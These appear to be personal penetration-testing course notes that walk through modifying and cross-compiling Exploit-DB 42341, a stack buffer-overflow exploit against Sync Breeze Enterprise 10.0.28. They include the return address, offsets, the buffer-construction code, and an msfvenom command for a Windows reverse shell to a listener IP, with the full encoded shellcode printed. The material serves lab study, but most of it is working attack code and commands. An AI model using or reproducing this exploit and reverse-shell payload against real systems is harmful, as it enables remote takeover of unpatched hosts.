

- Can be complex and difficult to modify  
	- Not only replace file paths, IPs, ports, URLs, possibly shellcode.  
		- If any of these mods alter the offset, we must adjust the buffer length to ensure we overwrite the RET properly.  
		- Some shellcode is required for exploit to work & needs to be reverse engineered to determine its safety.  
	- Also likely need to clone target env in a VM and use debugger to verify/ mod return address & offsets.  
  
  
General flow of standard stack overflow (in apps running w/o mitigations like DEP, ASLR, etc):  
1. Create large enough buffer to trigger the overflow.  
2. Take control of EIP by overwriting the RET addr by padding w/ appropriate offset.  
3. Include chosen payload w/in the buffer prepended by NOP sled.  
4. Choose correct RET addr (like JMP ESP) to redirect execution flow into our payload.  
  
  
Key diff:  
- Scripting languages are executed through an interpreter & not compiled to create a stand-alone exe.  
- Because they require an interpreter, this means we can't run a _Python_ script in an env where _Python_ isn't installed  
	- This can limit us in the field, esp if we need a stand-alone exploit (like local priv esc) that must run in an env that doesn't have Python pre-installed.  
- In a scripting lang like _Python_, concatenating a string is easy, but not allowed in a lang like C  
  
  
  
Practice - Exploit SyncBreeze Enterprise on Win client  
```bash
┌──(kali㉿kali)-[~/temp]  
└─$ searchsploit "sync breeze enterprise 10.0.28"  
--------------------------------------------------------------------------- ---------------------------------  
 Exploit Title                                                             |  Path  
--------------------------------------------------------------------------- ---------------------------------  
Sync Breeze Enterprise 10.0.28 - Denial of-Service (PoC)                   | windows/dos/43200.py  
Sync Breeze Enterprise 10.0.28 - Remote Buffer Overflow                    | windows/remote/42928.py  
Sync Breeze Enterprise 10.0.28 - Remote Buffer Overflow (PoC)              | windows/dos/42341.c   <--- HERE
--------------------------------------------------------------------------- ---------------------------------  
Shellcodes: No Results  
  
  
┌──(kali㉿kali)-[~/temp]  
└─$ searchsploit -m 42341
```


After mirroring the exploit to home dir
- Inspect code
```bash
# Core functionality
offset    = "A" * 780 
JMP_ESP   =  "\x83\x0c\x09\x10"
shellcode = "\x90"*16 + msf_shellcode
exploit   = offset + JMP_ESP + shellcode
```
  
- Find a header indicating code is meant to be compiled on Windows  
```bash
#include <winsock2.h>  
#include <windows.h>
```
	- Meaning it'll need to be cross-compiled on Kali


### Cross-Compiling

Recommenced to use native compilers for the specific operating system targeted by the code.  
As there are situations where we only have access to a single attack env, but need to leverage an exploit coded for a diff platform, we can use a cross-compiler.  
  
```bash
sudo apt install mingw-w64
```

[mingw-w64](mingw-w64.md) also works on Windows  

Determine if the exploit code compiles without errors by compiling the code into a Windows PE file:  
```bash
i686-w64-mingw32-gcc 42341.c -o syncBrz_exploit.exe  
	/usr/bin/i686-w64-mingw32-ld: /tmp/cc9sbIkM.o:syncBrz_EDB-42341.c:(.text+0x97): undefined reference to `_imp__WSAStartup@8'  
	/usr/bin/i686-w64-mingw32-ld: /tmp/cc9sbIkM.o:syncBrz_EDB-42341.c:(.text+0xa5): undefined reference to `_imp__WSAGetLastError@0'  
	/usr/bin/i686-w64-mingw32-ld: /tmp/cc9sbIkM.o:syncBrz_EDB-42341.c:(.text+0xe9): undefined reference to `_imp__socket@12'  
	/usr/bin/i686-w64-mingw32-ld: /tmp/cc9sbIkM.o:syncBrz_EDB-42341.c:(.text+0xfc): undefined reference to `_imp__WSAGetLastError@0'  
	/usr/bin/i686-w64-mingw32-ld: /tmp/cc9sbIkM.o:syncBrz_EDB-42341.c:(.text+0x126): undefined reference to `_imp__inet_addr@4'  
	/usr/bin/i686-w64-mingw32-ld: /tmp/cc9sbIkM.o:syncBrz_EDB-42341.c:(.text+0x146): undefined reference to `_imp__htons@4'  
	/usr/bin/i686-w64-mingw32-ld: /tmp/cc9sbIkM.o:syncBrz_EDB-42341.c:(.text+0x16f): undefined reference to `_imp__connect@12'  
	/usr/bin/i686-w64-mingw32-ld: /tmp/cc9sbIkM.o:syncBrz_EDB-42341.c:(.text+0x1b8): undefined reference to `_imp__send@16'  
	/usr/bin/i686-w64-mingw32-ld: /tmp/cc9sbIkM.o:syncBrz_EDB-42341.c:(.text+0x1eb): undefined reference to `_imp__closesocket@4'  
	collect2: error: ld returned 1 exit status  

```

Compiling errored out, so googling for the first error - "WSAStartup" - reveals the function is found in _winsock.h_  
Googling for exact error message gives answer in Stack Overflow: [https://stackoverflow.com/questions/34384803/c-undefined-reference-to-wsastartup8](https://stackoverflow.com/questions/34384803/c-undefined-reference-to-wsastartup8)  
	(These errors occur when the linker cannot find the *winsock* library)  
  
  
So, incorporating the suggestion works:  
```bash
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```

With the _-l_ option, we can instruct mingw-w64 to search for the *ws2_32* DLL and include it in the final executable via static linking.


### Changing Socket Info

Considering, this is a remotely-accessible vuln, we need to establish a connection. So we'll have to adjust the hardcoded IP and ports w/in the code _Lines 36 & 38_  
```bash
printf("[>] Socket created.\n");
server.sin_addr.s_addr = inet_addr("192.168.234.10");   <--- HERE
server.sin_family = AF_INET;
server.sin_port = htons(80);   <--- HERE
```

 
Will need to either **nc** it over to the Win machine to run OR run w/ **wine**  
  
(IF running wine & there's an error: wine: could not load kernel32.dll, status c0000135 follow these instructions: [https://forum.manjaro.org/t/wine-could-not-load-kernel32-dll-status-c0000135/69811)](https://forum.manjaro.org/t/wine-could-not-load-kernel32-dll-status-c0000135/69811))    


### Changing the Return Address:  
  
_Line 74_ - Has the RET address set for an address w/in _msvbvm60.dll_, which we know isn't utilized by SyncBreeze.  
```C
unsigned char retn[] = "\xcb\x75\x52\x73";  //ret at msvbvm60.dll
```
  
From earlier work w/ exploiting the app, we can replace the RET address w/ the one we used before: “\x83\x0c\x09\x10”; 0x10090c83 which points to the JMP ESP register  
  
If we haven't worked w/ the app previously, we can recreate the target env locally & use a debugger to determine the addr.

1. rdesktop into the Win env
2. **In Win**
	1. Search for services.msc > Run as Admin
	2. Navigate to Sync Breeze Enterprise > Start
	3. Launch Immunity Debugger as Admin
	4. File > Attach > SyncBreeze > Attach
	5. View > Executable Modules
	6. Verify **msvbv60.dll** (from retn\[] value line *74* ^) is missing
3. **In Kali** 
	1. Replace with RET value from the edb verified python script we didn't pick from searchsploit
	   ![](searchsploit_verify.png)
		- DON'T FORGET TO SWITCH ENDIANS!
		-  so `10 09 0c 83 libspp.dll`  becomes
		```C
		unsigned char retn[]= "\x83\x0c\x09\x10";
		```


If this isn't possible, we could use info from other publicly available exploits to get a reliable RET which will match our target env.  
- This isn't the most reliable  
Alternatively, we can obtain a RET directly from the target machine.  
- Need access as an unprivileged user,  
	- Run an exploit to elevate priv,  
	- Copy the DLLs that we're interest in onto our attack machine  
	- Use disassemblers or [msfpescan](msfpescan.md) to obtain a reliable RET


### Changing the Payload:

Taking a look at the payload given w/ in the exploit, it's difficult to determine its purpose. Only thing we _can_ see is the nop sled.  
So, it's crucial we replace the given shellcode w/ our own (keeping the nops)

-  As the bad characters are already described in the python payload we didn't pick (`searchsploit -p 42928`, we can use that to create our own:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.239 LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
	"\xdd\xc3\xd9\x74\x24\xf4\x5a\x31\xc9\xbe\xd7\xe8\x34\x96"
	"\xb1\x52\x83\xea\xfc\x31\x72\x13\x03\xa5\xfb\xd6\x63\xb5"
	"\x14\x94\x8c\x45\xe5\xf9\x05\xa0\xd4\x39\x71\xa1\x47\x8a"
	"\xf1\xe7\x6b\x61\x57\x13\xff\x07\x70\x14\x48\xad\xa6\x1b"
	"\x49\x9e\x9b\x3a\xc9\xdd\xcf\x9c\xf0\x2d\x02\xdd\x35\x53"
	"\xef\x8f\xee\x1f\x42\x3f\x9a\x6a\x5f\xb4\xd0\x7b\xe7\x29"
	"\xa0\x7a\xc6\xfc\xba\x24\xc8\xff\x6f\x5d\x41\xe7\x6c\x58"
	"\x1b\x9c\x47\x16\x9a\x74\x96\xd7\x31\xb9\x16\x2a\x4b\xfe"
	"\x91\xd5\x3e\xf6\xe1\x68\x39\xcd\x98\xb6\xcc\xd5\x3b\x3c"
	"\x76\x31\xbd\x91\xe1\xb2\xb1\x5e\x65\x9c\xd5\x61\xaa\x97"
	"\xe2\xea\x4d\x77\x63\xa8\x69\x53\x2f\x6a\x13\xc2\x95\xdd"
	"\x2c\x14\x76\x81\x88\x5f\x9b\xd6\xa0\x02\xf4\x1b\x89\xbc"
	"\x04\x34\x9a\xcf\x36\x9b\x30\x47\x7b\x54\x9f\x90\x7c\x4f"
	"\x67\x0e\x83\x70\x98\x07\x40\x24\xc8\x3f\x61\x45\x83\xbf"
	"\x8e\x90\x04\xef\x20\x4b\xe5\x5f\x81\x3b\x8d\xb5\x0e\x63"
	"\xad\xb6\xc4\x0c\x44\x4d\x8f\xf2\x31\x60\xe8\x9b\x43\x7a"
	"\xe7\x07\xcd\x9c\x6d\xa8\x9b\x37\x1a\x51\x86\xc3\xbb\x9e"
	"\x1c\xae\xfc\x15\x93\x4f\xb2\xdd\xde\x43\x23\x2e\x95\x39"
	"\xe2\x31\x03\x55\x68\xa3\xc8\xa5\xe7\xd8\x46\xf2\xa0\x2f"
	"\x9f\x96\x5c\x09\x09\x84\x9c\xcf\x72\x0c\x7b\x2c\x7c\x8d"
	"\x0e\x08\x5a\x9d\xd6\x91\xe6\xc9\x86\xc7\xb0\xa7\x60\xbe"
	"\x72\x11\x3b\x6d\xdd\xf5\xba\x5d\xde\x83\xc2\x8b\xa8\x6b"
	"\x72\x62\xed\x94\xbb\xe2\xf9\xed\xa1\x92\x06\x24\x62\xb2"
	"\xe4\xec\x9f\x5b\xb1\x65\x22\x06\x42\x50\x61\x3f\xc1\x50"
	"\x1a\xc4\xd9\x11\x1f\x80\x5d\xca\x6d\x99\x0b\xec\xc2\x9a"
	"\x19";
```

1. Add it to the `shellcode` variable after the NOP slide
2. Compile again
```bash
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```

3. **In Win**
	1. Back in Immunity Debugger
	2. Ctrl + G > Enter JMP address from python/ C code (**0x10090c83**) > OK
	3. F2 to Set a Breakpoint
	   ![](immunity_breakpoint.png)
	4. F9 to Run Normally
   
4. **In Kali**
	1. As the exploit we compiled is meant to run in Win env, need to use **wine**
	```bash
	sudo wine syncbreeze_exploit.exe
	```


As we've changed several things (& as discovered when running the exploit), our overflow does not quite fully cover EIP. So we need to modify it.  



### Changing the Overflow Buffer:

Looking at where the first part of our large padding buffer of A's are created, we see it starts w/ a call to _malloc_ w/ a size of 780:  
_Lines 70-71_  
```c
int initial_buffer_size = 780;  
char *padding = malloc(initial_buffer_size);
```
  
As 780 is the same offset we discovered during our [Win BO](11%20-%20BO%20Win.md#eip), that should be fine.  
  
However, looking at the rest of the code surrounding the buffer, we see that the final buffer is constructed as a string.  
C lang makes use of null-terminated strings. Meaning functions such as _strcpy_ and _strcat_ determine the end and size of a string by searching for the first NULL in the char array.  
  
Meaning, we end up concatenating (_strcat_) a string of 779 A's rather than the 780.  
_Lines 73, 110-118_  
```c
memset(padding + initial_buffer_size -1, 0x00, 1);  //<---- Null Byte
...  
...  
char *buffer = malloc(buffer_length);  
memset(buffer, 0x00, buffer_length);  
strcpy(buffer, request_one);  
strcat(buffer, content_length_string);  
strcat(buffer, request_two);  
strcat(buffer, padding);  
strcat(buffer, retn);  
strcat(buffer, shellcode);  
strcat(buffer, request_three);
```


In order to fix this, we only need to increase the requested memory size defined by the _initial_buffer_size_ var by 1:  
_Line 70_  
```c
int initial_buffer_size = 781;
```